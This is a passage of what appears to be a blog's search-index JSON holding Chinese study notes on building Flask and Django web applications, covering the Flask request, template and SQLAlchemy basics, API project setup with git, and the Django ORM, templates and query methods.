href=\"https://www.jianshu.com/p/9477a28f5079\">https://www.jianshu.com/p/9477a28f5079</a></p>\n","categories":["python"],"tags":["python-web"]},{"title":"python-web-flask-2","url":"/2022/08/17/python-web-flask-2/","content":"<h1 id=\"WEB应用开发-Flask第六天\"><a href=\"#WEB应用开发-Flask第六天\" class=\"headerlink\" title=\"WEB应用开发-Flask第六天\"></a>WEB应用开发-Flask第六天</h1><h2 id=\"一、Flask的技术点复习\"><a href=\"#一、Flask的技术点复习\" class=\"headerlink\" title=\"一、Flask的技术点复习\"></a>一、Flask的技术点复习</h2><ul>\n<li><p>请求与响应</p>\n</li>\n<li><p>flask依赖的三个基本库</p>\n</li>\n<li><p>flask项目的拆分：更好地体现mvc/mtv的设计思想，易于扩展和维护。</p>\n</li>\n<li><p>flask应用对象中属性的配置config</p>\n</li>\n<li><p>路由规则</p>\n</li>\n<li><p>视图处理</p>\n<ul>\n<li>request对象中的属性<code>(url, base_url, host_url, path, status_code, remote_addr)</code></li>\n<li>request对象中的字典属性<code>(args, form, cookies, headers, files)</code></li>\n<li>request对象中的获上传json数据的方法：request_get_json()</li>\n<li>生成响应对象<ul>\n<li>make_response(data, code)</li>\n<li>Response(data, code)</li>\n<li>jsonify(dict | list)</li>\n<li>redirect(path | url_for())重定向</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>模板技术</p>\n<ul>\n<li>模板文件的位置templates（一定和创建flask()对象所在python脚本同一级目录）</li>\n<li>模板文件即是html文件，只不过html文件中使用变量<code>&#123;&#123;  &#125;&#125;</code> 或语句格式<code>&#123;%  %&#125;</code></li>\n<li>模板结构语句块<code>&#123;% block %&#125;</code>、<code>&#123;% extends %&#125;</code>、<code>&#123;% include %&#125;</code>、<code>&#123;% macro %&#125;</code></li>\n<li>模板中的分支与循环语句<code>&#123;% if %&#125;</code>、<code>&#123;% else %&#125;</code>、<code>&#123;% elif %&#125;</code>、<code>&#123;% for %&#125; / &#123;&#123;loop&#125;&#125;</code></li>\n<li>模板过滤器：字符类型、格式化、列表、对象，自定义@app.template_filter(‘’)</li>\n</ul>\n</li>\n<li><p>数据模型sqlalchemy</p>\n<ul>\n<li><p>数据类型：String, integer, float, date, datetime, text, boolean, enum(‘枚举’)</p>\n</li>\n<li><p>约束：primary_key, unique, nullable, default, server_default, autoincrement, ForeignKey</p>\n</li>\n<li><p>模型类db.Model</p>\n</li>\n<li><p>字段类：db.Column()</p>\n</li>\n<li><p>模型字段的反向引用</p>\n<p>db.relationship(引用的类, backref=’引用类中新增属性’)</p>\n</li>\n<li><p>模型的多对多关系：使用第三个模型或第三个表db.Table</p>\n<img src=\"apiserver/%E5%A4%9A%E5%AF%B9%E5%A4%9A%E5%85%B3%E7%B3%BB%E7%9A%84%E6%A8%A1%E5%9E%8B.png\" alt=\"多对多关系的模型\" style=\"zoom:80%;\" /></li>\n<li><p>模型的CURD：</p>\n<ul>\n<li>db.session.query(类或字段).filter(条件)</li>\n<li>模型类.query.filter(条件) | all() | one()</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"二、Flask实现api接口开发\"><a href=\"#二、Flask实现api接口开发\" class=\"headerlink\" title=\"二、Flask实现api接口开发\"></a>二、Flask实现api接口开发</h2><ol>\n<li><p>创建环境（运行环境：1-virtualenv，2-conda）</p>\n<p>环境创建成功之后，需要安装相关的库</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">   pip install Flask==<span class=\"number\">2.1</span><span class=\"number\">.2</span></span><br><span class=\"line\">   flask-blueprint==<span class=\"number\">1.3</span><span class=\"number\">.0</span></span><br><span class=\"line\">   Flask-Cors==<span class=\"number\">3.0</span><span class=\"number\">.10</span></span><br><span class=\"line\">   Flask-Script==<span class=\"number\">2.0</span><span class=\"number\">.6</span></span><br><span class=\"line\">   Flask-SQLAlchemy==<span class=\"number\">2.5</span><span class=\"number\">.1</span></span><br><span class=\"line\">   PyMySQL==<span class=\"number\">1.0</span><span class=\"number\">.2</span></span><br><span class=\"line\">   redis==<span class=\"number\">2.10</span><span class=\"number\">.6</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">2.</span> 解决跨域问题-Flask-CORS</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">3.</span> 选择数据库操作框架（自定义DAO+SQL、SQLAlchemy-ORM、基于元类自定义ORM）</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">4.</span> 拆分项目结构（app, dao, utils, manage.py）</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">5.</span> 数据的交互json</span><br><span class=\"line\"></span><br><span class=\"line\">   - 前端上传json数据</span><br><span class=\"line\">   - 后端接收json并解析，最后生成json的结果数据响应给客户端</span><br><span class=\"line\"></span><br><span class=\"line\">代码托管到github：https://github.com/disenQF/edu_api_v3</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">### git操作流程</span></span><br><span class=\"line\"></span><br><span class=\"line\">首先在github创建新的名为“edu_api_v3”仓库</span><br><span class=\"line\"></span><br><span class=\"line\">```git init```</span><br><span class=\"line\"></span><br><span class=\"line\">```txt</span><br><span class=\"line\"><span class=\"comment\"># 创建.gitignore文件并添加以下</span></span><br><span class=\"line\">.idea</span><br><span class=\"line\">__pycache__</span><br><span class=\"line\">*.log*</span><br><span class=\"line\">venv</span><br></pre></td></tr></table></figure></li>\n</ol>\n<figure class=\"highlight markdown\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"section\"># 创建readme.md文件并添加以下</span></span><br><span class=\"line\"><span class=\"section\"># LL 教育app接口服务</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">## 一、安装部署</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">### 1.1 git clone</span></span><br><span class=\"line\"></span><br><span class=\"line\">git clone https://github.com/Z1174185292W/edu<span class=\"emphasis\">_api_</span>v3.git</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">### 1.2 virtualenv 创建python3的环境</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">### 1.3 安装requirements.txt依赖库</span></span><br></pre></td></tr></table></figure>\n\n<p><code>git add .</code></p>\n<p><code>git status</code></p>\n<p><code>git commit -m &#39;init_api_server&#39;</code></p>\n<p><code>git log</code></p>\n<p><code>git remote add origin git@github.com:Z1174185292W/edu_api_v3.git</code></p>\n<p><code>git config -l</code></p>\n<p><code>git push -u origin master</code></p>\n<p><code>git clone git@github.com:Z1174185292W/edu_api_v3.git</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">开发者角色：</span><br><span class=\"line\"></span><br><span class=\"line\">- 主管（搭建项目架构，上传code到github）</span><br><span class=\"line\"></span><br><span class=\"line\">- 开发人员</span><br><span class=\"line\"></span><br><span class=\"line\">  - 第一次从github clone代码、</span><br><span class=\"line\"></span><br><span class=\"line\">  - 创建项目运行环境</span><br><span class=\"line\"></span><br><span class=\"line\">  - 安装requirements.txt中的依赖库</span><br><span class=\"line\"></span><br><span class=\"line\">  - 启动项目</span><br><span class=\"line\"></span><br><span class=\"line\">  - 接收开发任务</span><br><span class=\"line\"></span><br><span class=\"line\">  - 任务code开发完成后，本地提交，上传到服务器（先更新，再上传）</span><br><span class=\"line\"></span><br><span class=\"line\">  - 第二天：开发新的任务之前，先更新代码（别人新增的任务）</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-任务（用户、角色和权限的关系模型）\"><a href=\"#2-1-任务（用户、角色和权限的关系模型）\" class=\"headerlink\" title=\"2.1 任务（用户、角色和权限的关系模型）\"></a>2.1 任务（用户、角色和权限的关系模型）</h3><p>增加用户角色：id，角色名称</p>\n<ul>\n<li><ol>\n<li>系统管理员</li>\n<li>普通用户</li>\n</ol>\n</li>\n</ul>\n<p>增加用户权限：id、名称</p>\n<ul>\n<li><ol>\n<li>delete_user</li>\n<li>create_user</li>\n<li>read_user</li>\n<li>update_user</li>\n<li>create_db</li>\n<li>drop_db</li>\n</ol>\n</li>\n</ul>\n<p>用户和角色的关系：多对多，一个用户有n个角色，一个角色有多个用户。</p>\n<p>角色和权限的关系：多对多，一个角色包含多个权限，一个权限被多个角色使用。</p>\n<p>勾子函数@app_before_request验证操作权限：在”/drop_db”操作时验证当前用户是否具备管理员的角色及删除表的权限</p>\n<h2 id=\"三、用户登录之token\"><a href=\"#三、用户登录之token\" class=\"headerlink\" title=\"三、用户登录之token\"></a>三、用户登录之token</h2><p>要求：当用户登录成功之后，通过uuid生成用户对应的token（身份令牌）。</p>\n<p>客户端：cookie存储token</p>\n<p>服务端：redis缓存存储token</p>\n<h1 id=\"WEB应用开发-Flask第七天\"><a href=\"#WEB应用开发-Flask第七天\" class=\"headerlink\" title=\"WEB应用开发-Flask第七天\"></a>WEB应用开发-Flask第七天</h1><h2 id=\"一、Ajax实现头像上传\"><a href=\"#一、Ajax实现头像上传\" class=\"headerlink\" title=\"一、Ajax实现头像上传\"></a>一、Ajax实现头像上传</h2><h3 id=\"1-1-文件上传的两种方式【了解】\"><a href=\"#1-1-文件上传的两种方式【了解】\" class=\"headerlink\" title=\"1.1 文件上传的两种方式【了解】\"></a>1.1 文件上传的两种方式【了解】</h3><ul>\n<li>表单标签方式上传，使用form标签和input的file类型的标签</li>\n<li>Ajax的DataForm方式上传文件</li>\n</ul>\n<h3 id=\"1-2-表单标签的方式上传文件\"><a href=\"#1-2-表单标签的方式上传文件\" class=\"headerlink\" title=\"1.2 表单标签的方式上传文件\"></a>1.2 表单标签的方式上传文件</h3><p>要求：form标签的enctype为“multipart/form-data”，且method=’post’</p>\n<h3 id=\"1-3-Ajax方式上传文件\"><a href=\"#1-3-Ajax方式上传文件\" class=\"headerlink\" title=\"1.3 Ajax方式上传文件\"></a>1.3 Ajax方式上传文件</h3><h2 id=\"二、Flask相关知识点\"><a href=\"#二、Flask相关知识点\" class=\"headerlink\" title=\"二、Flask相关知识点\"></a>二、Flask相关知识点</h2><ol>\n<li><p>flask中日志</p>\n<p><strong>日志的等级</strong>：logging.NOST - 0, DEBUG - 10, INFO - 20, WARNING - 30, ERROR - 40, CRITICAL - 50</p>\n<p>可以删除flask的默认日志处理器，可以增加自己的处理Handler</p>\n<p>常用的处理器Handler: </p>\n<ul>\n<li>logging.StreamHandler/FileHandler</li>\n<li>logging.handlers.HTTPHandler/SMTPHandler</li>\n</ul>\n<p>app.logger.info()</p>\n<p>??blue.logger.info()</p>\n</li>\n<li><p>分页查询</p>\n</li>\n<li><p>页面缓存：n秒内访问的页面不会多次渲染。</p>\n</li>\n<li><p>flask-restful</p>\n</li>\n</ol>\n","categories":["python"],"tags":["python-web"]},{"title":"python-web-django","url":"/2022/08/17/python-web-flask-3/","content":"<h1 id=\"WEB后端服务第11天\"><a href=\"#WEB后端服务第11天\" class=\"headerlink\" title=\"WEB后端服务第11天\"></a>WEB后端服务第11天</h1><p>【注意】在使用pycharm工具编写Django等框架时，首先在Settings&gt;Languages &amp; Frameworks&gt;下配置Django或其他框架的支持，以便在使用Python Console时更加兼容。常用的配置还有Template Languages，其他按需配置。</p>\n<h2 id=\"一、Django入门\"><a href=\"#一、Django入门\" class=\"headerlink\" title=\"一、Django入门\"></a>一、Django入门</h2><h3 id=\"1-1-基本概念\"><a href=\"#1-1-基本概念\" class=\"headerlink\" title=\"1.1 基本概念\"></a>1.1 基本概念</h3><h3 id=\"1-2-创建环境与app项目\"><a href=\"#1-2-创建环境与app项目\" class=\"headerlink\" title=\"1.2 创建环境与app项目\"></a>1.2 创建环境与app项目</h3><p>安装依赖包</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">pip install django==<span class=\"number\">2.0</span><span class=\"number\">.1</span></span><br></pre></td></tr></table></figure>\n\n<p>进入““终端”CMD命令，通过django-admin命令创建django项目。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">django-admin startproject helloDjango</span><br></pre></td></tr></table></figure>\n\n<p>通过django-admin命令创建app应用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">django-admin startapp mainapp</span><br></pre></td></tr></table></figure>\n\n<p>在一个Django项目中，存在很多的app应用（模块），创建好的app需要注册到主工程中（settings.py）</p>\n<h3 id=\"1-3-django项目结构\"><a href=\"#1-3-django项目结构\" class=\"headerlink\" title=\"1.3 django项目结构\"></a>1.3 django项目结构</h3><p>项目结构如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">helloDjango</span><br><span class=\"line\">\t|--- helloDjango 主工程目录</span><br><span class=\"line\">\t\t|--- settings.py\t设置文件，数据库连接，app注册，中间件及模板配置</span><br><span class=\"line\">\t\t|--- urls.py\t总路由</span><br><span class=\"line\">\t\t|--- wsgi.py\tDjango实现wsgi的脚本</span><br><span class=\"line\">\t\t|--- __init__.py</span><br><span class=\"line\">\t|--- mainapp\t应用模块（主）</span><br><span class=\"line\">\t\t|--- __init__.py</span><br><span class=\"line\">\t\t|--- admin.py\t# 后台管理配置脚本</span><br><span class=\"line\">\t\t|--- models.py\t# 数据模型类声明所在脚本</span><br><span class=\"line\">\t\t|--- views.py\t# 声明当前应用的视图处理函数或类</span><br><span class=\"line\">\t\t|--- urls.py\t# 自己增加的当前应用模块的子路由</span><br><span class=\"line\">\t\t|--- tests.py\t# 当前应用模块的单元测试类</span><br><span class=\"line\">\t\t|--- apps.py\t# 声明当前应用的基本信息</span><br><span class=\"line\">\t|--- manage.py\t WEB应用的启动脚本，项目工程的入口</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"1-4-Django请求流程\"><a href=\"#1-4-Django请求流程\" class=\"headerlink\" title=\"1.4 Django请求流程\"></a>1.4 Django请求流程</h3><ol>\n<li>到urls分发器</li>\n<li>urls分发器根据路由规则（正则）分发到views</li>\n<li>views去调用Model，交互数据</li>\n<li>views将数据渲染到模板中</li>\n<li>模板呈现给用户</li>\n</ol>\n<h2 id=\"二、数据库连接与ORM模型\"><a href=\"#二、数据库连接与ORM模型\" class=\"headerlink\" title=\"二、数据库连接与ORM模型\"></a>二、数据库连接与ORM模型</h2><h3 id=\"2-1-数据库连接配置\"><a href=\"#2-1-数据库连接配置\" class=\"headerlink\" title=\"2.1 数据库连接配置\"></a>2.1 数据库连接配置</h3><p>默认是sqlite3数据库，在使用ORM模型之前，需要先生成迁移文件，再执行迁移命令，在数据库中生成这些模型对应的表。</p>\n<ul>\n<li>先生成迁移文件</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">python manage.py makemigrations</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>开始迁移（生成表、修改表、删除表）</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">python manage.py migrate</span><br></pre></td></tr></table></figure>\n\n<p>注意：一旦生成了迁移文件并且迁移成功之后，不要删除迁移文件。</p>\n<h3 id=\"2-2-初步使用ORM模型\"><a href=\"#2-2-初步使用ORM模型\" class=\"headerlink\" title=\"2.2 初步使用ORM模型\"></a>2.2 初步使用ORM模型</h3><p>在app模块中的models.py定义一个用户（客户）模型</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> django.db <span class=\"keyword\">import</span> models</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">UserEntity</span>(models.Model):</span><br><span class=\"line\">    <span class=\"comment\"># 默认情况下会自动创建id主键</span></span><br><span class=\"line\">    name = models.CharField(max_length=<span class=\"number\">20</span>)</span><br><span class=\"line\">    age = models.IntegerField(default=<span class=\"number\">0</span>)</span><br><span class=\"line\">    phone = models.CharField(max_length=<span class=\"number\">11</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title class_\">Meta</span>:</span><br><span class=\"line\">        <span class=\"comment\"># 指定当前模型类映射成哪一个表</span></span><br><span class=\"line\">        db_table = <span class=\"string\">&#x27;app_user&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>模型创建完成后，先后执行生成迁移文件和迁移。</p>\n<h3 id=\"2-3-CURD\"><a href=\"#2-3-CURD\" class=\"headerlink\" title=\"2.3 CURD\"></a>2.3 CURD</h3><p>查询</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">UserEntity.objects.<span class=\"built_in\">all</span>()\t<span class=\"comment\"># 查询所有</span></span><br><span class=\"line\">UserEntity.objects.get(pk=<span class=\"built_in\">id</span>)\t<span class=\"comment\"># 根据主键值查询一个实体对象</span></span><br></pre></td></tr></table></figure>\n\n<p>增加</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">u = UserEntity()</span><br><span class=\"line\">u.name = <span class=\"string\">&#x27;disen&#x27;</span></span><br><span class=\"line\">u.age = <span class=\"number\">20</span></span><br><span class=\"line\">u.phone = <span class=\"string\">&#x27;177&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 保存模型对象</span></span><br><span class=\"line\">u.save()</span><br></pre></td></tr></table></figure>\n\n<p>删除</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">u = UserEntity.objects.get(<span class=\"number\">1</span>)</span><br><span class=\"line\">u.delete() <span class=\"comment\"># 删除</span></span><br></pre></td></tr></table></figure>\n\n<p>更新</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">u = UserEntity.objects.get(<span class=\"number\">3</span>)</span><br><span class=\"line\">u.name = <span class=\"string\">&#x27;cheng&#x27;</span></span><br><span class=\"line\">u.save()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"三、Admin的site站点配置\"><a href=\"#三、Admin的site站点配置\" class=\"headerlink\" title=\"三、Admin的site站点配置\"></a>三、Admin的site站点配置</h2><h2 id=\"四、综合案例-水果管理\"><a href=\"#四、综合案例-水果管理\" class=\"headerlink\" title=\"四、综合案例-水果管理\"></a>四、综合案例-水果管理</h2><h3 id=\"3-1-模型设计\"><a href=\"#3-1-模型设计\" class=\"headerlink\" title=\"3.1 模型设计\"></a>3.1 模型设计</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Fruit 水果模型类（name, price, source, cate_type_id）</span><br><span class=\"line\"># FruitImage 水果图片模型类(fruit_id, url, width, height, name)</span><br><span class=\"line\"># CateType 水果分类(name, order_num)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># Store 水果商店(name, name, boss_name, phone, address, city, lat, lon)</span><br><span class=\"line\"># StoreDetail 水果商店的详情</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-2-模板的基本使用\"><a href=\"#3-2-模板的基本使用\" class=\"headerlink\" title=\"3.2 模板的基本使用\"></a>3.2 模板的基本使用</h3><p>循环语句块</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;% for item in items %&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>\n\n<p>分支循环</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;% if 条件表达式 %&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>\n\n<p>变量</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&#123; 变量名 &#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在views.py视图函数中，渲染模板</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span> render(request, <span class=\"string\">&#x27;fruit/list.html&#x27;</span>, <span class=\"built_in\">locals</span>())</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-3-页面设计\"><a href=\"#3-3-页面设计\" class=\"headerlink\" title=\"3.3 页面设计\"></a>3.3 页面设计</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;% block name %&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;% extends &quot;base.html&quot; %&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"WEB后端服务第12天-Django第二天\"><a href=\"#WEB后端服务第12天-Django第二天\" class=\"headerlink\" title=\"WEB后端服务第12天-Django第二天\"></a>WEB后端服务第12天-Django第二天</h1><h2 id=\"一、ORM模型之字段类型和约束\"><a href=\"#一、ORM模型之字段类型和约束\" class=\"headerlink\" title=\"一、ORM模型之字段类型和约束\"></a>一、ORM模型之字段类型和约束</h2><h3 id=\"1-1-字段类型\"><a href=\"#1-1-字段类型\" class=\"headerlink\" title=\"1.1 字段类型\"></a>1.1 字段类型</h3><h3 id=\"1-2-约束\"><a href=\"#1-2-约束\" class=\"headerlink\" title=\"1.2 约束\"></a>1.2 约束</h3><h3 id=\"1-3-FileField和ImageField\"><a href=\"#1-3-FileField和ImageField\" class=\"headerlink\" title=\"1.3 FileField和ImageField\"></a>1.3 FileField和ImageField</h3><p>文件字段和图片字段都属于MEDIA的多媒体类型的文件，需要在settings.py设置脚本中指定MEDIA_ROOT、MEDIA_URL、STATIC_URL、STATICFILES_DIRS</p>\n<p>注意：使用ImageField时，必须安装Pillow库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pip install pillow</span><br></pre></td></tr></table></figure>\n\n<p>扩展：github: <a href=\"https://github.com/disenQF/StoreOA.git\">https://github.com/disenQF/StoreOA.git</a></p>\n<h2 id=\"二、模型的Meta元信息\"><a href=\"#二、模型的Meta元信息\" class=\"headerlink\" title=\"二、模型的Meta元信息\"></a>二、模型的Meta元信息</h2><p>在模型类中，声明内部类Meta，类成员可以如下的变量：</p>\n<ul>\n<li>db_table</li>\n<li>ordering</li>\n<li>verbose_name</li>\n<li>verbose_name_plural</li>\n<li>unique_together</li>\n<li>abstract 布尔类型，表示当前的模型类是否为抽象类，如果是抽象类，则不会创建表。</li>\n</ul>\n<h3 id=\"3-渲染模板的render-方法有哪些参数，分别代表什么含义\"><a href=\"#3-渲染模板的render-方法有哪些参数，分别代表什么含义\" class=\"headerlink\" title=\"3. 渲染模板的render()方法有哪些参数，分别代表什么含义\"></a>3. 渲染模板的render()方法有哪些参数，分别代表什么含义</h3><ul>\n<li>request请求对象，是django.http.HttpRequest类的对象</li>\n<li>模板的html文件，是字符串类型，文件位置相对于templates目录的。</li>\n<li>context上下文，是dict字典类型，可以使用locals()将本地的变量转成字典对象。</li>\n</ul>\n<h2 id=\"三、CURD深度使用\"><a href=\"#三、CURD深度使用\" class=\"headerlink\" title=\"三、CURD深度使用\"></a>三、CURD深度使用</h2><h3 id=\"3-1-了解模型类中的objects是什么？\"><a href=\"#3-1-了解模型类中的objects是什么？\" class=\"headerlink\" title=\"3.1 了解模型类中的objects是什么？\"></a>3.1 了解模型类中的objects是什么？</h3><p>默认情况下，由创建模型类的元类在模型类中创建django.db.models.Manager类的对象，并赋给objects。Manager类实际是QuerySet类的子类。</p>\n<p>可以在模型类中，创建objects，但是必须为Manager类对象。不能是普通的字段。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">CateTypeEntity</span>(models.Model):</span><br><span class=\"line\">\tname = models.CharField(max_length)</span><br><span class=\"line\">\t<span class=\"comment\"># objects = models.IntegerField(default=0)  # 错误的写法</span></span><br><span class=\"line\">\tobjects = models.Manager()  <span class=\"comment\"># 正确的写法</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-2-filter和exclude查询\"><a href=\"#3-2-filter和exclude查询\" class=\"headerlink\" title=\"3.2 filter和exclude查询\"></a>3.2 filter和exclude查询</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">模型类.objects.<span class=\"built_in\">filter</span>(属性名__条件=条件值)</span><br><span class=\"line\">模型类.objects.<span class=\"built_in\">filter</span>(属性名=条件值)</span><br><span class=\"line\">模型类.objects.<span class=\"built_in\">filter</span>(属性名__时间标签__条件=条件值)</span><br></pre></td></tr></table></figure>\n\n<p><strong>条件</strong>包含</p>\n<ul>\n<li>大于gt、小于lt、大于等于gte、小于等于lte</li>\n<li>字符串相关：contains包含（区分大小写），icontains，(i)startswith、(i)endswith</li>\n<li>null相关：isnull()、isnotnull()</li>\n<li>范围：in</li>\n</ul>\n<p><strong>时间属性</strong>包含</p>\n<ul>\n<li>year, month, day</li>\n<li>hour, minute, second</li>\n</ul>\n<h3 id=\"3-3-QuerySet对象的方法\"><a href=\"#3-3-QuerySet对象的方法\" class=\"headerlink\" title=\"3.3 QuerySet对象的方法\"></a>3.3 QuerySet对象的方法</h3><p>QuerySet对象的本身是可以被迭代的。</p>\n<p>返回QuerySet对象的方法有：</p>\n<ul>\n<li>filter()</li>\n<li>exclude()</li>\n<li>all()</li>\n<li>value()</li>\n<li>values_list()</li>\n<li>order_by(‘name’, ‘-city’)</li>\n</ul>\n<p>统计方法和判断是否存在数据方法</p>\n<ul>\n<li>count()</li>\n<li>exists()</li>\n</ul>\n<h1 id=\"WEB后端服务第13天-Django第三天\"><a href=\"#WEB后端服务第13天-Django第三天\" class=\"headerlink\" title=\"WEB后端服务第13天-Django第三天\"></a>WEB后端服务第13天-Django第三天</h1><p>官方文档：<a href=\"http://docs.djangoproject.com/zh-hans/2.1/\">http://docs.djangoproject.com/zh-hans/2.1/</a></p>\n<h2 id=\"一、F和Q的用法\"><a href=\"#一、F和Q的用法\" class=\"headerlink\" title=\"一、F和Q的用法\"></a>一、F和Q的用法</h2><p>1.1 F的选择字段值</p>\n<p>django.db.models.F用于获取字段的值并参与计算或作业更新条件。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">FruitEntity.objects.update(price=F(<span class=\"string\">&#x27;price&#x27;</span>) * <span class=\"number\">0.88</span>)  <span class=\"comment\"># 全场8.8折</span></span><br></pre></td></tr></table></figure>\n\n<p>1.2 Q的多条件</p>\n<p>Q是用来指定多个查询条件的逻辑关系：与 &amp;，或 |，非 -</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查询价格低于1的，或高于200的水果, 或原产地是xian且名字中包含“果”</span></span><br><span class=\"line\">    fruits2 = FruitEntity.objects.<span class=\"built_in\">filter</span>(</span><br><span class=\"line\">        Q(price__lte=<span class=\"number\">1</span>) | Q(price__gte=<span class=\"number\">200</span>) | Q(Q(source=<span class=\"string\">&#x27;xian&#x27;</span>) &amp; Q(name__contains=<span class=\"string\">&quot;果&quot;</span>))).values()</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"二、原生的SQL语句查询\"><a href=\"#二、原生的SQL语句查询\" class=\"headerlink\" title=\"二、原生的SQL语句查询\"></a>二、原生的SQL语句查询</h2><p>针对复杂查询来说，通过QuerySet查询不是特别方便，则使用原生的SQL查询。</p>\n<ul>\n<li><p>QuerySet提供两种原生SQL查询：</p>\n<ol>\n<li><p>QuerySet.raw()</p>\n<p>要求：查询的字段必须是模型类中声明的字段，且必须存在主键列。查询的结果是RawQuerySet类对象，可以迭代，元素类型是模型类对象。</p>\n<p>另外，查询sql语句中可以使用”%s”或”%(name)s”占位符，在其后可以使用元组或字典参数传值</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">raw_queryset = FruitEntity.objects.raw(<span class=\"string\">&#x27;select id, name, price from t_fruit where price &lt; %s order by price DESC LIMIT %s, 5&#x27;</span>, (<span class=\"number\">10</span>, <span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> fruit <span class=\"keyword\">in</span> raw_queryset:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(fruit)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">raw_queryset = FruitEntity.objects.raw(<span class=\"string\">&#x27;select id, name, price from t_fruit where price &lt; %(price)s order by price DESC LIMIT %(page)s, 5&#x27;</span>, &#123;<span class=\"string\">&#x27;price&#x27;</span>:<span class=\"number\">10</span>, <span class=\"string\">&#x27;page&#x27;</span>:<span class=\"number\">0</span>&#125;)</span><br></pre></td></tr></table></figure></li>\n<li><p>QuerySet.extra()</p>\n<p>extra()扩展查询，针对QuerySet查询结果集中，额外增加查询条件或排序等相关操作。返回结果还是<strong>QuerySet</strong>对象。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">qs1 = FruitEntity.objects.extra(where=[<span class=\"string\">&#x27;price&lt;%s&#x27;</span>], params=[<span class=\"string\">&#x27;10&#x27;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">qs2 = FruitEntity.objects.extra(where=[<span class=\"string\">&#x27;price&lt;%s or name like %s&#x27;</span>], params=[<span class=\"string\">&#x27;2&#x27;</span>, <span class=\"string\">&#x27;果&#x27;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">qs3 = FruitEntity.objects.extra(where=[<span class=\"string\">&#x27;price&lt;%s or name like %s&#x27;</span>, <span class=\"string\">&#x27;source=%s&#x27;</span>], params=[<span class=\"string\">&#x27;100&#x27;</span>, <span class=\"string\">&#x27;果&#x27;</span>, <span 